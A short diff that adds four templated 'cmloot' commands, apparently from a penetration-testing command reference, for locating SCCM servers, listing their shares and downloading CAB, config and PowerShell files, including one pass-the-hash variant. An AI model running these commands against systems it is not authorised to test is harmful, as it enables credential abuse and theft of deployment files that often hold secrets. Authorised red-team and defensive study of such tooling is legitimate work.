@@ -1,0 +1,4 @@
+cmloot "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" -findsccmservers
+cmloot "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+cmloot "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" -cmlootdownload sccmfiles.txt -extensions CAB CONF PS1
+cmloot "$DOMAIN"/"$USER"@"$TARGET" -cmlootdownload sccmfiles.txt -extensions CAB CONF PS1 -hashes ":$NT_HASH"
